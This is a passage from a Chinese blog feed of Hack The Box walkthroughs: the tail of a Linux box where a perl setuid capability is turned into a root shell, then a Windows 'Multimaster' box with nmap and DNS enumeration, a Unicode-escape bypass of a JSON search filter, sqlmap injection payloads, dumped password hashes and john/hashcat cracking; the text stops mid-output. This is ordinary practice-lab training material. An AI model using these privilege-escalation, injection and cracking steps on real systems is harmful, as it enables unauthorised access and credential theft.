class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">david@nunchucks:~$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> david: <br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> david: <br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> david: <br>sudo: 3 incorrect password attempts<br>david@nunchucks:~$ <br></code></pre></td></tr></table></figure><p>有个备份脚本，但是需要root去执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">david@nunchucks:/opt$ <span class="hljs-built_in">ls</span><br>backup.pl  web_backups<br>david@nunchucks:/opt$ <span class="hljs-built_in">which</span> pl<br>david@nunchucks:/opt$ <span class="hljs-built_in">which</span> perl<br>/usr/bin/perl<br>david@nunchucks:/opt$ <span class="hljs-built_in">getcap</span> /usr/bin/perl<br>/usr/bin/perl = cap_setuid+ep<br>david@nunchucks:/opt$<br></code></pre></td></tr></table></figure><p>perl有SUID：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">david@nunchucks:/opt$ /usr/bin/perl -e <span class="hljs-string">&#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;cat /root/root.txt&quot;;&#x27;</span><br><span class="hljs-built_in">cat</span>: /root/root.txt: Permission denied<br>david@nunchucks:/opt$ /usr/bin/perl -e <span class="hljs-string">&#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;id&quot;;&#x27;</span><br>uid=0(root) gid=1000(david) <span class="hljs-built_in">groups</span>=1000(david)<br>david@nunchucks:/opt$ /usr/bin/perl -e <span class="hljs-string">&#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;whoami&quot;;&#x27;</span><br>root<br>david@nunchucks:/opt$ <span class="hljs-built_in">cd</span> /tmp/<br>david@nunchucks:/tmp$ <span class="hljs-built_in">touch</span> a.pl<br>david@nunchucks:/tmp$ <span class="hljs-built_in">cat</span> a.pl <br><span class="hljs-comment">#!/usr/bin/perl</span><br>use POSIX qw(strftime);<br>use POSIX qw(setuid);<br>POSIX::setuid(0);<br><br><span class="hljs-built_in">exec</span> <span class="hljs-string">&quot;/bin/sh&quot;</span><br>david@nunchucks:/tmp$ /usr/bin/perl ./a.pl <br>Can<span class="hljs-string">&#x27;t open perl script &quot;./a.pl&quot;: Permission denied</span><br><span class="hljs-string">david@nunchucks:/tmp$ chmod +x ./a.pl</span><br><span class="hljs-string">david@nunchucks:/tmp$ /usr/bin/perl ./a.pl </span><br><span class="hljs-string">Can&#x27;</span>t open perl script <span class="hljs-string">&quot;./a.pl&quot;</span>: Permission denied<br>david@nunchucks:/tmp$ ./a.pl <br><span class="hljs-comment"># whoami</span><br>root<br><span class="hljs-comment"># cat /root/root.txt</span><br>d44............................<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough Multimaster</title>
    <link href="/post/HackTheBox-Multimaster.html"/>
    <url>/post/HackTheBox-Multimaster.html</url>
    
    <content type="html"><![CDATA[<h3 id="PortInfo"><a href="#PortInfo" class="headerlink" title="PortInfo:"></a>PortInfo:</h3><p>快速扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ sudo nmap -p- --min-rate 10000 10.10.10.179 -Pn -oN portinfo<br>[sudo] archlinux 的密码：Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-22 12:55 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.179<br>Host is up (0.10s latency).<br>Not shown: 65512 filtered tcp ports (no-response)<br>PORT      STATE SERVICE<br>53/tcp    open  domain<br>80/tcp    open  http<br>88/tcp    open  kerberos-sec<br>135/tcp   open  msrpc<br>139/tcp   open  netbios-ssn<br>389/tcp   open  ldap<br>445/tcp   open  microsoft-ds<br>464/tcp   open  kpasswd5<br>593/tcp   open  http-rpc-epmap<br>636/tcp   open  ldapssl<br>3268/tcp  open  globalcatLDAP<br>3269/tcp  open  globalcatLDAPssl<br>3389/tcp  open  ms-wbt-server<br>5985/tcp  open  wsman<br>9389/tcp  open  adws<br>49666/tcp open  unknown<br>49667/tcp open  unknown<br>49670/tcp open  unknown<br>49675/tcp open  unknown<br>49676/tcp open  unknown<br>49679/tcp open  unknown<br>49698/tcp open  unknown<br>49707/tcp open  unknown<br></code></pre></td></tr></table></figure><p>识别端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ sudo nmap -sC -sV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -Pn 10.10.10.179 -O -oN portinfo.txt<br>Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-22 12:58 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.179<br>Host is up (0.078s latency).<br><br>PORT     STATE SERVICE      VERSION<br>53/tcp   open  domain       Simple DNS Plus<br>80/tcp   open  http         Microsoft IIS httpd 10.0<br>|_http-server-header: Microsoft-IIS/10.0<br>|_http-title: MegaCorp<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-12-22 05:05:38Z)<br>135/tcp  open  msrpc        Microsoft Windows RPC<br>139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn<br>389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)<br>445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)<br>464/tcp  open  kpasswd5?<br>593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0<br>636/tcp  open  tcpwrapped<br>3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)<br>3269/tcp open  tcpwrapped<br>5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>9389/tcp open  mc-nmf       .NET Message Framing<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running (JUST GUESSING): Microsoft Windows 2016|2012|2008|10 (91%)<br>OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10:1607<br>Aggressive OS guesses: Microsoft Windows Server 2016 (91%), Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows 10 1607 (85%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">Host script results:<br>|_clock-skew: mean: 2h46m57s, deviation: 4h37m08s, median: 6m56s<br>| smb-os-discovery: <br>|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)<br>|   Computer name: MULTIMASTER<br>|   NetBIOS computer name: MULTIMASTER\x00<br>|   Domain name: MEGACORP.LOCAL<br>|   Forest name: MEGACORP.LOCAL<br>|   FQDN: MULTIMASTER.MEGACORP.LOCAL<br>|_  System time: 2022-12-21T21:05:49-08:00<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled and required<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-12-22T05:05:52<br>|_  start_date: 2022-12-22T05:00:11<br>| smb-security-mode: <br>|   account_used: &lt;blank&gt;<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: required<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 58.11 seconds<br></code></pre></td></tr></table></figure><p>是台windows 2016的可能性大点，Nmap扫出来内部域是MEGACORP.LOCAL，利用目标53端口进行确认：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ dig any MEGACORP.LOCAL @10.10.10.179   <br><br>; &lt;&lt;&gt;&gt; DiG 9.18.12-1-Debian &lt;&lt;&gt;&gt; any MEGACORP.LOCAL @10.10.10.179<br>;; global options: +cmd<br>;; Got answer:<br>;; WARNING: .<span class="hljs-built_in">local</span> is reserved <span class="hljs-keyword">for</span> Multicast DNS<br>;; You are currently testing what happens when an mDNS query is leaked to DNS<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 22440</span><br><span class="hljs-string">;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 2</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; OPT PSEUDOSECTION:</span><br><span class="hljs-string">; EDNS: version: 0, flags:; udp: 4000</span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;MEGACORP.LOCAL.                        IN      ANY</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">MEGACORP.LOCAL.         600     IN      A       10.10.10.34</span><br><span class="hljs-string">MEGACORP.LOCAL.         3600    IN      NS      multimaster.MEGACORP.LOCAL.</span><br><span class="hljs-string">MEGACORP.LOCAL.         3600    IN      SOA     multimaster.MEGACORP.LOCAL. hostmaster.MEGACORP.LOCAL. 232 900 600 86400 3600</span><br><span class="hljs-string">MEGACORP.LOCAL.         600     IN      AAAA    dead:beef::c43:a2ae:dbff:9645</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ADDITIONAL SECTION:</span><br><span class="hljs-string">multimaster.MEGACORP.LOCAL. 3600 IN     A       10.10.10.179</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 140 msec</span><br><span class="hljs-string">;; SERVER: 10.10.10.179#53(10.10.10.179) (TCP)</span><br><span class="hljs-string">;; WHEN: Mon Mar 27 14:13:07 CST 2023</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 176</span><br></code></pre></td></tr></table></figure><h3 id="SQL-injection："><a href="#SQL-injection：" class="headerlink" title="SQL injection："></a>SQL injection：</h3><p>在80端口运行的web服务里有一项 <strong>Colleague Finder</strong>，当搜索框提交数据为空的时候会把所有同事都遍历出来：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222131735983.png" alt="image-20221222131735983"></p><p>这样就有了一份用户名字典，</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs powershell">sbauer@megacorp.htb<br>okent@megacorp.htb<br>ckane@megacorp.htb<br>kpage@megacorp.htb<br>shayna@megacorp.htb<br>james@megacorp.htb<br>cyork@megacorp.htb<br>rmartin@megacorp.htb<br>zac@magacorp.htb<br>jorden@megacorp.htb<br>alyx@megacorp.htb<br>ilee@megacorp.htb<br>nbourne@megacorp.htb<br>zpowers@megacorp.htb<br>aldom@megacorp.htb<br>minato@megacorp.htb<br>egre55@megacorp.htb<br></code></pre></td></tr></table></figure><p>然后可以抓包找注入，有过滤：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222132540362.png" alt="image-20221222132540362"></p><p>但这个过滤只是对特殊符号有规则限制，而且过滤的不多。</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222134519413.png" alt="image-20221222134519413"></p><p>而且返回包里指定了编码格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Content-Type: application/json;charset=utf-8<br></code></pre></td></tr></table></figure><p>就可以将特殊符号进行<strong>Unicode</strong>编码，来尝试绕过，比如原先输入单引号是会被拦截的，但是如果输入Unicode编码的单引号，就直接过掉了：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20221222142706449.png" alt="image-20221222142706449"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r /home/archlinux/HackTheBox/sqltest --batch --level 5 --delay 5 --risk 3 --proxy http://127.0.0.1:8080 --tamper=charunicodeescape<br></code></pre></td></tr></table></figure><p>SQLMap的payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap identified the following injection point(s) with a total of 74 HTTP(s) requests:<br>---<br>Parameter: JSON <span class="hljs-comment">#1* ((custom) POST)</span><br>    Type: boolean-based blind<br>    Title: AND boolean-based blind - WHERE or HAVING clause<br>    Payload: &#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;&#x27; AND 3136=3136-- JEie&quot;</span>&#125;<br><br>    Type: stacked queries<br>    Title: Microsoft SQL Server/Sybase stacked queries (comment)<br>    Payload: &#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;&#x27;;WAITFOR DELAY &#x27;0:0:5&#x27;--&quot;</span>&#125;<br><br>    Type: time-based blind<br>    Title: Microsoft SQL Server/Sybase time-based blind (IF)<br>    Payload: &#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;&#x27; WAITFOR DELAY &#x27;0:0:5&#x27;-- Dpvn&quot;</span>&#125;<br><br>    Type: UNION query<br>    Title: Generic UNION query (NULL) - 5 columns<br>    Payload: &#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;-1791&#x27; UNION ALL SELECT 92,92,CHAR(113)+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(113)+CHAR(87)+CHAR(85)+CHAR(111)+CHAR(69)+CHAR(72)+CHAR(85)+CHAR(73)+CHAR(88)+CHAR(89)+CHAR(85)+CHAR(72)+CHAR(69)+CHAR(89)+CHAR(68)+CHAR(74)+CHAR(109)+CHAR(103)+CHAR(104)+CHAR(98)+CHAR(117)+CHAR(70)+CHAR(121)+CHAR(68)+CHAR(74)+CHAR(109)+CHAR(79)+CHAR(121)+CHAR(90)+CHAR(115)+CHAR(74)+CHAR(110)+CHAR(74)+CHAR(80)+CHAR(82)+CHAR(117)+CHAR(110)+CHAR(74)+CHAR(78)+CHAR(113)+CHAR(72)+CHAR(113)+CHAR(122)+CHAR(113)+CHAR(106)+CHAR(113),92,92-- rPjk&quot;</span>&#125;<br>---<br></code></pre></td></tr></table></figure><p>可以跑出岗位描述：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">+----+----------------------+----------------------+-------------+----------------------+<br>| <span class="hljs-built_in">id</span> | name                 | email                | image       | position             |<br>+----+----------------------+----------------------+-------------+----------------------+<br>| 1  | Sarina Bauer         | sbauer@megacorp.htb  | sbauer.jpg  | Junior Developer     |<br>| 2  | Octavia Kent         | okent@megacorp.htb   | okent.jpg   | Senior Consultant    |<br>| 3  | Christian Kane       | ckane@megacorp.htb   | ckane.jpg   | Assistant Manager    |<br>| 4  | Kimberly Page        | kpage@megacorp.htb   | kpage.jpg   | Financial Analyst    |<br>| 5  | Shayna Stafford      | shayna@megacorp.htb  | shayna.jpg  | HR Manager           |<br>| 6  | James Houston        | james@megacorp.htb   | james.jpg   | QA Lead              |<br>| 7  | Connor York          | cyork@megacorp.htb   | cyork.jpg   | Web Developer        |<br>| 8  | Reya Martin          | rmartin@megacorp.htb | rmartin.jpg | Tech Support         |<br>| 9  | Zac Curtis           | zac@magacorp.htb     | zac.jpg     | Junior Analyst       |<br>| 10 | Jorden Mclean        | jorden@megacorp.htb  | jorden.jpg  | Full-Stack Developer |<br>| 11 | Alyx Walters         | alyx@megacorp.htb    | alyx.jpg    | Automation Engineer  |<br>| 12 | Ian Lee              | ilee@megacorp.htb    | ilee.jpg    | Internal Auditor     |<br>| 13 | Nikola Bourne        | nbourne@megacorp.htb | nbourne.jpg | Head of Accounts     |<br>| 14 | Zachery Powers       | zpowers@megacorp.htb | zpowers.jpg | Credit Analyst       |<br>| 15 | Alessandro Dominguez | aldom@megacorp.htb   | aldom.jpg   | Senior Web Developer |<br>| 16 | MinatoTW             | minato@megacorp.htb  | minato.jpg  | CEO                  |<br>| 17 | egre55               | egre55@megacorp.htb  | egre55.jpg  | CEO                  |<br>+----+----------------------+----------------------+-------------+----------------------+<br></code></pre></td></tr></table></figure><p>还有哈希：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">Database: Hub_DB<br>Table: Logins<br>[17 entries]<br>+----+--------------------------------------------------------------------------------------------------+----------+<br>| <span class="hljs-built_in">id</span> | password                                                                                         | username |<br>+----+--------------------------------------------------------------------------------------------------+----------+<br>| 1  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | sbauer   |<br>| 2  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | okent    |<br>| 3  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | ckane    |<br>| 4  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | kpage    |<br>| 5  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | shayna   |<br>| 6  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | james    |<br>| 7  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | cyork    |<br>| 8  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | rmartin  |<br>| 9  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | zac      |<br>| 10 | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | jorden   |<br>| 11 | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | alyx     |<br>| 12 | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | ilee     |<br>| 13 | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | nbourne  |<br>| 14 | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | zpowers  |<br>| 15 | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | aldom    |<br>| 16 | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc | minatotw |<br>| 17 | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc | egre55   |<br>+----+--------------------------------------------------------------------------------------------------+----------+<br></code></pre></td></tr></table></figure><p>但是没法直接–os-shell,而且哈希细看其实也就四串：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739<br>fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa<br>68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813<br>cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc<br></code></pre></td></tr></table></figure><p>在线网站识别的是SHA2-384：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://www.tunnelsup.com/hash-analyzer/<br></code></pre></td></tr></table></figure><p>john自动识别的是SHA-384,但是没跑出来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ john <span class="hljs-built_in">hash</span> -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt<br>--------------------------------------------------------------------------<br>The library attempted to open the following supporting CUDA libraries,<br>but each of them failed.  CUDA-aware support is disabled.<br>libcuda.so.1: cannot open shared object file: No such file or directory<br>libcuda.dylib: cannot open shared object file: No such file or directory<br>/usr/lib64/libcuda.so.1: cannot open shared object file: No such file or directory<br>/usr/lib64/libcuda.dylib: cannot open shared object file: No such file or directory<br>If you are not interested <span class="hljs-keyword">in</span> CUDA-aware support, <span class="hljs-keyword">then</span> run with<br>--mca opal_warn_on_missing_libcuda 0 to suppress this message.  If you are interested<br><span class="hljs-keyword">in</span> CUDA-aware support, <span class="hljs-keyword">then</span> try setting LD_LIBRARY_PATH to the location<br>of libcuda.so.1 to get passed this issue.<br>--------------------------------------------------------------------------<br>Using default input encoding: UTF-8<br>Loaded 4 password hashes with no different salts (Raw-SHA384 [SHA384 128/128 AVX 2x])<br>Warning: poor OpenMP scalability <span class="hljs-keyword">for</span> this <span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span>, consider --fork=16<br>Will run 16 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>0g 0:00:00:00 DONE (2022-12-22 14:54) 0g/s 16116Kp/s 16116Kc/s 64466KC/s (CAMO)..*7¡Vamos!<br></code></pre></td></tr></table></figure><p>最后去尝试了其他类型跑了出来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">Archlinux:~/HackTheBox$ hashcat -a 0 -m 17900 --force ./hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --force <br>hashcat (v6.2.6) starting<br><br>You have enabled --force to bypass dangerous warnings and errors!<br>This can hide serious problems and should only be <span class="hljs-keyword">done</span> when debugging.<br>Do not report hashcat issues encountered when using --force.<br><br>OpenCL API (OpenCL 3.0 PoCL 3.1  Linux, Release, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="hljs-comment">#1 [The pocl project]</span><br>======================================================================================================================================<br>* Device <span class="hljs-comment">#1: pthread-AMD Ryzen 7 6800H with Radeon Graphics, 